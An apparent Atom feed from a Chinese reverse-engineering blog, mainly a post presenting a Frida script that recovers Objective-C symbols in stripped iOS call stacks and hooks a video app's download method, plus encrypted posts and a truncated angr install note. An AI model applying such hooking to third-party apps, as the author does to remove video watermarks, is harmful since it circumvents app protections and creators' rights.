    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title>android调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid-debug-note/andoid-debug-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid-debug-note/andoid-debug-note/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-08-01T07:52:05.503Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"/>
    
      <category term="debug" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/debug/"/>
    
  </entry>
  
  <entry>
    <title>Android AutoJS 脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-07-30T07:55:01.711Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code">    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="AutoJS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/AutoJS/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib 